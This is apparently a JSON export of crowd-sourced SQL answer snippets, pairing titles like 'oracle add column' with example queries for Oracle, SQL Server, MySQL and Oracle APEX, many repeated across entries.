    "description": "SELECT     [s_tst].[session_id],     [s_es].[login_name] AS [Login Name],     DB_NAME (s_tdt.database_id) AS [Database],     [s_tdt].[database_transaction_begin_time] AS [Begin Time],     [s_tdt].[database_transaction_log_bytes_used] AS [Log Bytes],     [s_tdt].[database_transaction_log_bytes_reserved] AS [Log Rsvd],     [s_est].text AS [Last T-SQL Text],     [s_eqp].[query_plan] AS [Last Plan] FROM     sys.dm_tran_database_transactions [s_tdt] JOIN     sys.dm_tran_session_transactions [s_tst] ON     [s_tst].[transaction_id] = [s_tdt].[transaction_id] JOIN     sys.[dm_exec_sessions] [s_es] ON     [s_es].[session_id] = [s_tst].[session_id] JOIN     sys.dm_exec_connections [s_ec] ON     [s_ec].[session_id] = [s_tst].[session_id] LEFT OUTER JOIN     sys.dm_exec_requests [s_er] ON     [s_er].[session_id] = [s_tst].[session_id] CROSS APPLY     sys.dm_exec_sql_text ([s_ec].[most_recent_sql_handle]) AS [s_est] OUTER APPLY     sys.dm_exec_query_plan ([s_er].[plan_handle]) AS [s_eqp] ORDER BY     [Begin Time] ASC; GO \n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2597,
    "keyword": null,
    "link": null,
    "title": " opening master key sql",
    "description": "OPEN MASTER KEY DECRYPTION BY PASSWORD = 'password'    \n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2598,
    "keyword": null,
    "link": null,
    "title": " opening xampp mysql in cmd ubuntu",
    "description": "/opt/lampp/bin/mysql -u root\n/opt/lampp/bin/mysql -u root \n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2599,
    "keyword": null,
    "link": null,
    "title": " operator does not exist: integer = text",
    "description": "SELECT ... WHERE table1.integer = table2.text_integer::numeric\n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2600,
    "keyword": null,
    "link": null,
    "title": " operator in mysql",
    "description": "SELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\nThe AND operator is a logical operator that combines two or more Boolean expressions and returns true only if both expressions evaluate to true. The AND operator returns false if one of the two expressions evaluate to false.  Here is the syntax of the AND operator:  SELECT      customername,      country,      state FROM     customers WHERE     country = 'USA' AND state = 'CA';\n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2601,
    "keyword": null,
    "link": null,
    "title": " operator in sql",
    "description": "You use the operators in any clause (except the From clause)  With Date and Timestamp - can only use addition and subtraction  Add (+), Subtract (-), Multiply (*), Divide (/)\n=\tChecks if the values of two operands are equal or not, if yes then condition becomes true.\t(a = b) is not true. !=\tChecks if the values of two operands are equal or not, if values are not equal then condition becomes true.\t(a != b) is true. <>\tChecks if the values of two operands are equal or not, if values are not equal then condition becomes true.\t(a <> b) is true. >\tChecks if the value of left operand is greater than the value of right operand, if yes then condition becomes true.\t(a > b) is not true. <\tChecks if the value of left operand is less than the value of right operand, if yes then condition becomes true.\t(a < b) is true. >=\tChecks if the value of left operand is greater than or equal to the value of right operand, if yes then condition becomes true.\t(a >= b) is not true. <=\tChecks if the value of left operand is less than or equal to the value of right operand, if yes then condition becomes true.\t(a <= b) is true. !<\tChecks if the value of left operand is not less than the value of right operand, if yes then condition becomes true.\t(a !< b) is false. !>\tChecks if the value of left operand is not greater than the value of right operand, if yes then condition becomes true.\t(a !> b) is true.\n(IN) operator in sql like \"OR\" operator For example:  Select * From employees Where department_id \"IN\" (60,90);  \n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2602,
    "keyword": null,
    "link": null,
    "title": " optimize sql query",
    "description": "-- ORACLE: get explain plan for a query -- Without execution EXPLAIN PLAN FOR select ...; SELECT * FROM TABLE(dbms_xplan.display); -- With execution SELECT /*+ gather_plan_statistics */  ...; SELECT * FROM TABLE(dbms_xplan.display_cursor(NULL,NULL,'ALLSTATS LAST'));\n",
    "reg_date": "2021-10-12T09:57:58.000Z"
  },
  {
    "id": 2603,
    "keyword": null,
    "link": null,
    "title": " ora-00979 not a group by expression in oracle 19c",
    "description": "SELECT a, b, sum(c) FROM my_table GROUP BY a;\t\t-- Error SELECT a, b, sum(c) FROM my_table GROUP BY a, b;\t-- OK, all expressions there -- CASE WHEN statement, for example: SELECT a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END AS r, sum(c)  FROM my_table GROUP BY a, CASE WHEN b=1 THEN 'Ok' ELSE 'Ko' END;\t\t-- No alias name (r)\n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2604,
    "keyword": null,
    "link": null,
    "title": " ora-01109 database not open in oracle 19c",
    "description": "ALTER DATABASE OPEN;\n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2605,
    "keyword": null,
    "link": null,
    "title": " ora-01950 no privileges on tablespace",
    "description": "ALTER USER <user> QUOTA UNLIMITED ON <tablespace name>;\n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2606,
    "keyword": null,
    "link": null,
    "title": " ora-06502: pl/sql: numeric or value error: character string buffer too small",
    "description": "ORA-06502: PL/SQL: numeric or value error: character string buffer too small. Cause: Variable length into clause v_variable1 is 5 character where output that trying to store in that variable is more than 5 character which cause the error. Solution: Increase the length of the variable v_variable1.\n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2607,
    "keyword": null,
    "link": null,
    "title": " oracle: using statement",
    "description": "SELECT table1.column, table2.column FROM table1 JOIN table2 USING (join_column1, join_column2&hellip;); \nSQL> SELECT location_id, street_address, postal_code, country_name   2  FROM locations   3  JOIN countries   4  USING (country_id);  \n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2608,
    "keyword": null,
    "link": null,
    "title": " oracle DROP PROGRAM",
    "description": "BEGIN   DBMS_SCHEDULER.drop_program (program_name => 'program_name'); END;\n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2609,
    "keyword": null,
    "link": null,
    "title": " oracle SQL developer",
    "description": "/* Answer to: \"oracle SQL developer\" */  /*   Oracle SQL Developer is an Integrated development environment for   working with SQL in Oracle databases. Oracle Corporation provides   this product free; it uses the Java Development Kit.    Download it here:   https://www.oracle.com/tools/downloads/sqldev-downloads.html */\nSelect   REGEXP_SUBSTR(Column1,'\\Name=([^.]+)',1,1,null,1) as Name , regexp_substr(Column1,'\\Branch Number=([^.]+)',1,1,null,1) as Branch_Number , regexp_substr(Column1,'\\Type of Event=([^.]+)',1,1,null,1) as Type_of_Event , regexp_substr(Column1,'\\Date of Event=([^.]+)',1,1,null,1) as Date_of_Event  From table1  Where... \n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2610,
    "keyword": null,
    "link": null,
    "title": " oracle SQL update",
    "description": "UPDATE T_NAME SET PARAM_1=23, PARAM_2=true WHERE PARAM_7= 'something'\nUPDATE mytable t\t\t-- Update using WITH statement SET value3 = (     WITH comp AS (         SELECT id, value1         FROM mytable t         WHERE value2 > 10     )     SELECT c.value1     FROM comp c     WHERE c.id = t.id );\nUPDATE table SET column1 = expression1,     column2 = expression2,     ...     column_n = expression_n [WHERE conditions];\n{     UPDATE table-Name [[AS] correlation-Name]         SET column-Name = Value         [ , column-Name = Value} ]*         [WHERE clause] |     UPDATE table-Name         SET column-Name = Value         [ , column-Name = Value ]*         WHERE CURRENT OF }\n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2611,
    "keyword": null,
    "link": null,
    "title": " oracle activate job",
    "description": "CALL DBMS_SCHEDULER.ENABLE('job_name'); CALL DBMS_SCHEDULER.DISABLE('job_name');\n",
    "reg_date": "2021-10-12T09:57:59.000Z"
  },
  {
    "id": 2612,
    "keyword": null,
    "link": null,
    "title": " oracle active transactions",
    "description": "-- Active transactions (generating UNDO) SELECT s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR, sum(t.USED_UBLK) FROM V$TRANSACTION t,      V$SESSION s WHERE t.ADDR = s.TADDR GROUP BY s.SID, s.SERIAL#, s.CLIENT_INFO, t.ADDR;\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2613,
    "keyword": null,
    "link": null,
    "title": " oracle add auto increment column to existing table",
    "description": "-- Use a sequence: CREATE SEQUENCE id_seq START WITH 1; INSERT INTO my_table (ID, VALUE) VALUES (id_seq.NEXTVAL, 'My value');\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2614,
    "keyword": null,
    "link": null,
    "title": " oracle add column",
    "description": "ALTER TABLE table_name  ADD column_name data_type constraint; \nALTER TABLE tablename MODIFY columnname varchar2(100)\n-- ALTER TABLE <table> ADD <column> <type>  <constraint>; ALTER TABLE members ADD age NUMBER; ALTER TABLE members ADD birth_date DATE NOT NULL; ALTER TABLE members ADD registering DATE DEFAULT sysdate; ALTER TABLE members ADD member_id NUMBER UNIQUE;\nALTER TABLE table_name   ADD column_name column_definition;\nALTER TABLE table_name  \tADD column_name data_type constraint;\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2615,
    "keyword": null,
    "link": null,
    "title": " oracle add column comment",
    "description": "COMMENT ON COLUMN TABLE_NAME.MY_COLUMN IS 'A column comment'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME'; -- All schema columns: SELECT t.OWNER, t.TABLE_NAME, c.COLUMN_NAME, com.COMMENTS FROM DBA_TABLES t LEFT JOIN DBA_TAB_COLUMNS c     ON c.OWNER = t.OWNER AND c.TABLE_NAME = t.TABLE_NAME LEFT JOIN DBA_COL_COMMENTS com ON com.OWNER = c.OWNER AND com.TABLE_NAME = c.TABLE_NAME     AND com.COLUMN_NAME = c.COLUMN_NAME WHERE t.OWNER = 'MY_OWNER' AND t.DROPPED = 'NO' ORDER BY t.OWNER, t.TABLE_NAME, c.COLUMN_NAME;\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2616,
    "keyword": null,
    "link": null,
    "title": " oracle add column with default value",
    "description": "-- ALTER TABLE <table> ADD <column> <type>  <constraint>; ALTER TABLE members ADD age NUMBER; ALTER TABLE members ADD birth_date DATE NOT NULL; ALTER TABLE members ADD registering DATE DEFAULT sysdate; ALTER TABLE members ADD member_id NUMBER UNIQUE;\nalter table DWSODS01.DWT00301_ORD_DTL_OMS add ( COMB_ORD_FLG NUMBER(5,0) default 0 not nulll);   alter table DWSODS01.DWT00301_ORD_DTL_OMS add ( COMB_ORD_NO NUMBER(12,0) default 0 not null); \n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2617,
    "keyword": null,
    "link": null,
    "title": " oracle add datafile to tablespace",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'my_tbs' ORDER BY FILE_NAME;  ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF; -- Autoextend with max size: ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 10G AUTOEXTEND ON NEXT 1G MAXSIZE 32000M;     -- For TEMP tablespace: ALTER TABLESPACE my_tbs ADD TEMPFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF;\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2618,
    "keyword": null,
    "link": null,
    "title": " oracle add month",
    "description": "SELECT sysdate + 1 FROM dual; \t\t\t\t-- Tomorrow    12/01/2021 14:27:27 SELECT trunc(sysdate) + 1 FROM dual; \t\t-- Tomorrow    12/01/2021 00:00:00 SELECT sysdate + INTERVAL '20' DAY FROM DUAL;\t\t-- 20 days ahead (other way) SELECT sysdate + 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ahead SELECT sysdate + 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ahead SELECT add_months(trunc(sysdate), 1) FROM dual;   \t-- 1 month ahead (no time) SELECT trunc(sysdate) + 30 FROM dual;\t\t\t\t-- 30 days ahead (no time) SELECT add_months(trunc(sysdate), +12*2) FROM dual;\t-- 2 years ahead (no time)\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2619,
    "keyword": null,
    "link": null,
    "title": " oracle add months to sysdate",
    "description": "SELECT sysdate + 1 FROM dual; \t\t\t\t-- Tomorrow    12/01/2021 14:27:27 SELECT trunc(sysdate) + 1 FROM dual; \t\t-- Tomorrow    12/01/2021 00:00:00 SELECT sysdate + INTERVAL '20' DAY FROM DUAL;\t\t-- 20 days ahead (other way) SELECT sysdate + 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ahead SELECT sysdate + 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ahead SELECT add_months(trunc(sysdate), 1) FROM dual;   \t-- 1 month ahead (no time) SELECT trunc(sysdate) + 30 FROM dual;\t\t\t\t-- 30 days ahead (no time) SELECT add_months(trunc(sysdate), +12*2) FROM dual;\t-- 2 years ahead (no time)\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2620,
    "keyword": null,
    "link": null,
    "title": " oracle add proxy",
    "description": "-- Grants proxy connection to OTHER_SCHEMA for MY_USER. -- Connexion User: MY_USER[OTHER_SCHEMA] ALTER USER OTHER_SCHEMA GRANT CONNECT THROUGH MY_USER;\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2621,
    "keyword": null,
    "link": null,
    "title": " oracle add time to date",
    "description": "SELECT sysdate + 1 FROM dual; \t\t\t\t-- Tomorrow    12/01/2021 14:27:27 SELECT trunc(sysdate) + 1 FROM dual; \t\t-- Tomorrow    12/01/2021 00:00:00 SELECT sysdate + 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ahead SELECT sysdate + 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ahead SELECT add_months(trunc(sysdate), 1) FROM dual;   \t-- 1 month ahead (no time) SELECT trunc(sysdate) + 30 FROM dual;\t\t\t\t-- 30 days ahead (no time) SELECT add_months(trunc(sysdate), +12*2) FROM dual;\t-- 2 years ahead (no time)\n",
    "reg_date": "2021-10-12T09:58:00.000Z"
  },
  {
    "id": 2622,
    "keyword": null,
    "link": null,
    "title": " oracle add unique constraint to column",
    "description": "ALTER TABLE table_name ADD CONSTRAINT constraint_name UNIQUE (column1, column2, ... column_n);\nALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col_name);  ALTER TABLE table_name ADD CONSTRAINT cst_name UNIQUE (col1, col2); -- Multiple ALTER TABLE table_name ADD col_name NUMBER UNIQUE;\t\t\t\t  \t-- New field\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2623,
    "keyword": null,
    "link": null,
    "title": " oracle aleter trigger ora-01031",
    "description": "GRANT ADMINISTER DATABASE TRIGGER TO user_name;\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2624,
    "keyword": null,
    "link": null,
    "title": " oracle all dates between two dates",
    "description": "SELECT (END_DT - START_DT) * 60 * 60 * 24 FROM MY_TABLE;   \t-- Seconds SELECT (END_DT - START_DT) * 60 * 24 FROM MY_TABLE;   \t\t-- Minutes SELECT (END_DT - START_DT) * 24 FROM MY_TABLE;   \t\t\t-- Hours\n-- All dates between 01/01/2021 and 15/01/2021 SELECT to_date('01/01/2021', 'DD/MM/YYYY') + ROWNUM - 1 FROM ALL_OBJECTS WHERE ROWNUM <= to_date('15/01/2021', 'DD/MM/YYYY')  \t- to_date('01/01/2021', 'DD/MM/YYYY') + 1;\nselect floor(months_between(date '2012-10-10', date '2011-10-10') /12) from dual;  select floor(months_between(date '2012-10-9' , date '2011-10-10') /12) from dual; \n  v_numvar := dt1-dt2;\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2625,
    "keyword": null,
    "link": null,
    "title": " oracle all dependencies",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2626,
    "keyword": null,
    "link": null,
    "title": " oracle all scheduler programs",
    "description": "-- Depending on connected user grants: SELECT * FROM ALL_SCHEDULER_PROGRAMS ORDER BY OWNER, PROGRAM_NAME; SELECT * FROM DBA_SCHEDULER_PROGRAMS WHERE OWNER = 'schema_name'; SELECT * FROM USER_SCHEDULER_PROGRAMS;\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2627,
    "keyword": null,
    "link": null,
    "title": " oracle all source",
    "description": "select * from   all_source where  lower(text) like lower('%Some source%');\nSELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2628,
    "keyword": null,
    "link": null,
    "title": " oracle all source package body",
    "description": "SELECT * FROM all_source    -- or user_source or dba_source WHERE upper(text) LIKE '%MY TEXT%' \tAND TYPE IN ('FUNCTION','PROCEDURE','PACKAGE') ORDER BY owner, name, type, line;\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2629,
    "keyword": null,
    "link": null,
    "title": " oracle all tables",
    "description": "SELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All database Tables\nSELECT * FROM ALL_TABLES;\nSELECT   table_name, owner FROM   all_tables ORDER BY   owner, table_name \nSELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLES_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All Tables\n-- NOTE: for Oracle ONLY  select *  from all_tables;\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2630,
    "keyword": null,
    "link": null,
    "title": " oracle all tables in schema",
    "description": "SELECT * FROM USER_TABLES;\t\t-- Tables from connected schema SELECT * FROM ALL_TABLES;\t\t-- Tables available to connected schema \tSELECT * FROM ALL_TABLES WHERE OWNER = 'SCHEMA_NAME'; \tSELECT * FROM ALL_TABLES WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM DBA_TABLES;\t\t-- All database Tables\n-- NOTE: for Oracle ONLY  select *  from all_tables;\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2631,
    "keyword": null,
    "link": null,
    "title": " oracle alter sequence nextval",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';  ALTER SEQUENCE seq_name INCREMENT BY 100;\t-- Value to reach desired value - 1 SELECT seq_name.nextval FROM dual;\t\t\t-- Reinitialize value to desired ALTER SEQUENCE seq_name INCREMENT BY 1;\t\t-- Back to init step\nSELECT schema.seq_name.NEXTVAL FROM dual;  INSERT INTO table_name (VALUE1) VALUES ( \tschema.seq_name.NEXTVAL AS VALUE1 );\n select sec_codigolibros.nextval from dual; \n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2632,
    "keyword": null,
    "link": null,
    "title": " oracle alter sequence restart start with",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';  ALTER SEQUENCE seq_name INCREMENT BY 100;\t-- Value to reach desired value - 1 SELECT seq_name.nextval FROM dual;\t\t\t-- Reinitialize value to desired ALTER SEQUENCE seq_name INCREMENT BY 1;\t\t-- Back to init step\n",
    "reg_date": "2021-10-12T09:58:01.000Z"
  },
  {
    "id": 2633,
    "keyword": null,
    "link": null,
    "title": " oracle alter table add column not null",
    "description": "-- ALTER TABLE <table> ADD <column> <type>  <constraint>; ALTER TABLE members ADD age NUMBER; ALTER TABLE members ADD birth_date DATE NOT NULL; ALTER TABLE members ADD registering DATE DEFAULT sysdate; ALTER TABLE members ADD member_id NUMBER UNIQUE;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2634,
    "keyword": null,
    "link": null,
    "title": " oracle alter tablespace add datafile autoextend max size",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'my_tbs' ORDER BY FILE_NAME;  ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF; -- Autoextend with max size: ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 10G AUTOEXTEND ON NEXT 1G MAXSIZE 32000M;     -- For TEMP tablespace: ALTER TABLESPACE my_tbs ADD TEMPFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2635,
    "keyword": null,
    "link": null,
    "title": " oracle apex APEX.AUTHORIZATION.ACCESS DENIED",
    "description": "Shared Components > Security > Application Access Control     > Add User Role Assignment\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2636,
    "keyword": null,
    "link": null,
    "title": " oracle apex You are not authorized to view this application",
    "description": "Shared Components > Security > Application Access Control     > Add User Role Assignment\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2637,
    "keyword": null,
    "link": null,
    "title": " oracle apex charging debug",
    "description": "DECLARE     l_value varchar2(100) := 'test value';     l_long_msg VARCHAR2(32767) := 'output anything up to varchar2 limit'; BEGIN     APEX_DEBUG_MESSAGE.ENABLE_DEBUG_MESSAGES(p_level => 3);  -- 1 is most important     APEX_DEBUG_MESSAGE.LOG_MESSAGE(\t\t\t\t\t-- Short message (4000 max)         p_message => 'l_value = ' || l_value, p_level => 1 );      APEX_DEBUG_MESSAGE.LOG_LONG_MESSAGE(         p_message => l_long_msg, p_level => 1 );   \t-- Long message        APEX_DEBUG.INFO('Information message'); END;\nPROCEDURE my_proc (p_id IN NUMBER, p_emp IN emp%ROWTYPE) IS BEGIN     APEX_DEBUG.ENTER('my_proc', 'p_id', p_id, 'p_emp.id' , p_emp.id);     APEX_DEBUG.LOG_PAGE_SESSION_STATE;\t-- saves all items     MY_PACKAGE.MY_FUNCTION;\t\t\t\t     APEX_DEBUG.LOG_DBMS_OUTPUT(p_prefix=>'[Debug] ');     APEX_DEBUG.INFO('my_proc successfully finished.'); EXCEPTION     WHEN OTHERS THEN APEX_DEBUG.ERROR('Critical error %s', sqlerrm);         RAISE; END;\nSELECT adb.APEX_USER,        adb.APPLICATION_ID, wal.APPLICATION_NAME, adb.PAGE_ID,        adb.MESSAGE, adb.MESSAGE_TIMESTAMP,        adb.PAGE_VIEW_ID, adb.SESSION_ID FROM APEX_WORKSPACE_ACTIVITY_LOG wal INNER JOIN APEX_DEBUG_MESSAGES adb ON wal.DEBUG_PAGE_VIEW_ID = adb.PAGE_VIEW_ID;\nSELECT * FROM APEX_WORKSPACE_ACTIVITY_LOG      WHERE WORKSPACE = 'wks_name'     AND APEX_USER = 'user_name'     AND APPLICATION_ID = 'app_id';      SELECT * FROM APEX_DEBUG_MESSAGES;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2638,
    "keyword": null,
    "link": null,
    "title": " oracle apex check if collection exists",
    "description": "BEGIN   IF NOT APEX_COLLECTION.COLLECTION_EXISTS('EMPLOYEE_COLLECTION') THEN       APEX_COLLECTION.CREATE_COLLECTION('EMPLOYEE_COLLECTION');   END IF; END;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2639,
    "keyword": null,
    "link": null,
    "title": " oracle apex collection.add member",
    "description": "BEGIN   APEX_COLLECTION.ADD_MEMBER(           P_COLLECTION_NAME => 'EMPLOYEE_COLLECTION',           P_C001 => :P2_EMP_NO,           P_C002 => :P2_EMP_NAME       ); END;\nDECLARE     CURSOR c_emp IS         SELECT EMP_NO, EMP_NAME FROM EMP; BEGIN     IF NOT APEX_COLLECTION.COLLECTION_EXISTS('EMPLOYEE_COLLECTION')     THEN APEX_COLLECTION.CREATE_COLLECTION('EMPLOYEE_COLLECTION');     ELSE APEX_COLLECTION.TRUNCATE_COLLECTION('EMPLOYEE_COLLECTION');     END IF;      FOR c IN c_emp         LOOP             APEX_COLLECTION.ADD_MEMBER(P_COLLECTION_NAME => 'EMPLOYEE_COLLECTION',                                        P_C001 => c.EMP_NO,                                        P_C002 => c.EMP_NAME                 );         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2640,
    "keyword": null,
    "link": null,
    "title": " oracle apex collection add element",
    "description": "BEGIN   APEX_COLLECTION.ADD_MEMBER(           P_COLLECTION_NAME => 'EMPLOYEE_COLLECTION',           P_C001 => :P2_EMP_NO,           P_C002 => :P2_EMP_NAME       ); END;\nDECLARE     CURSOR c_emp IS         SELECT EMP_NO, EMP_NAME FROM EMP; BEGIN     IF NOT APEX_COLLECTION.COLLECTION_EXISTS('EMPLOYEE_COLLECTION')     THEN APEX_COLLECTION.CREATE_COLLECTION('EMPLOYEE_COLLECTION');     ELSE APEX_COLLECTION.TRUNCATE_COLLECTION('EMPLOYEE_COLLECTION');     END IF;      FOR c IN c_emp         LOOP             APEX_COLLECTION.ADD_MEMBER(P_COLLECTION_NAME => 'EMPLOYEE_COLLECTION',                                        P_C001 => c.EMP_NO,                                        P_C002 => c.EMP_NAME                 );         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2641,
    "keyword": null,
    "link": null,
    "title": " oracle apex collection delete member",
    "description": "BEGIN     APEX_COLLECTION.DELETE_MEMBER(         p_collection_name => 'EMPLOYEES_CL',         p_seq => '2');\t-- sequence ID of the collection member to be deleted  \t-- Deletes all members having 'ADMIN' for attr n&deg;5     APEX_COLLECTION.DELETE_MEMBERS(             p_collection_name => 'EMPLOYEE_CL',             p_attr_number => 5,             p_attr_value => 'ADMIN'); END;\nBEGIN     APEX_COLLECTION.DELETE_COLLECTION(p_collection_name => 'EMPLOYEE_CL');     -- All collections belonging to current session     APEX_COLLECTION.DELETE_ALL_COLLECTIONS_SESSION;     -- All collections belonging to current user     APEX_COLLECTION.DELETE_ALL_COLLECTIONS; END;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2642,
    "keyword": null,
    "link": null,
    "title": " oracle apex collection exists",
    "description": "BEGIN   IF NOT APEX_COLLECTION.COLLECTION_EXISTS('EMPLOYEE_COLLECTION') THEN       APEX_COLLECTION.CREATE_COLLECTION('EMPLOYEE_COLLECTION');   END IF; END;\n",
    "reg_date": "2021-10-12T09:58:02.000Z"
  },
  {
    "id": 2643,
    "keyword": null,
    "link": null,
    "title": " oracle apex date pattern",
    "description": "# At graph level: Attributes [Tab] >>> Time Axis Type > Enabled Axis > x >>> select Date - Short > Pattern > 'dd/MM'  # Standard format: yyyy-MM-dd HH:mm:ss\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2644,
    "keyword": null,
    "link": null,
    "title": " oracle apex debug message",
    "description": "DECLARE     l_value varchar2(100) := 'test value';     l_long_msg VARCHAR2(32767) := 'output anything up to varchar2 limit'; BEGIN     APEX_DEBUG_MESSAGE.ENABLE_DEBUG_MESSAGES(p_level => 3);  -- 1 is most important     APEX_DEBUG_MESSAGE.LOG_MESSAGE(\t\t\t\t\t-- Short message (4000 max)         p_message => 'l_value = ' || l_value, p_level => 1 );      APEX_DEBUG_MESSAGE.LOG_LONG_MESSAGE(         p_message => l_long_msg, p_level => 1 );   \t-- Long message        APEX_DEBUG.INFO('Information message'); END;\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2645,
    "keyword": null,
    "link": null,
    "title": " oracle apex debug mode",
    "description": "f?p=app:page:session::YES/LEVELx::: -- x is between 1 (least detailed) and 9 (most detailed) f?p=100:1:&APP_SESSION.::YES f?p=100:1:&APP_SESSION.::LEVEL5 -- OR APEX_DEBUG.enable(p_level) -- OR APEX_SESSION.set_debug(p_session_id,p_level)    -- p_level: NULL to disable\nDECLARE     l_value varchar2(100) := 'test value';     l_long_msg VARCHAR2(32767) := 'output anything up to varchar2 limit'; BEGIN     APEX_DEBUG_MESSAGE.ENABLE_DEBUG_MESSAGES(p_level => 3);  -- 1 is most important     APEX_DEBUG_MESSAGE.LOG_MESSAGE(\t\t\t\t\t-- Short message (4000 max)         p_message => 'l_value = ' || l_value, p_level => 1 );      APEX_DEBUG_MESSAGE.LOG_LONG_MESSAGE(         p_message => l_long_msg, p_level => 1 );   \t-- Long message        APEX_DEBUG.INFO('Information message'); END;\nSELECT adb.APEX_USER,        adb.APPLICATION_ID, wal.APPLICATION_NAME, adb.PAGE_ID,        adb.MESSAGE, adb.MESSAGE_TIMESTAMP,        adb.PAGE_VIEW_ID, adb.SESSION_ID FROM APEX_WORKSPACE_ACTIVITY_LOG wal INNER JOIN APEX_DEBUG_MESSAGES adb ON wal.DEBUG_PAGE_VIEW_ID = adb.PAGE_VIEW_ID;\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2646,
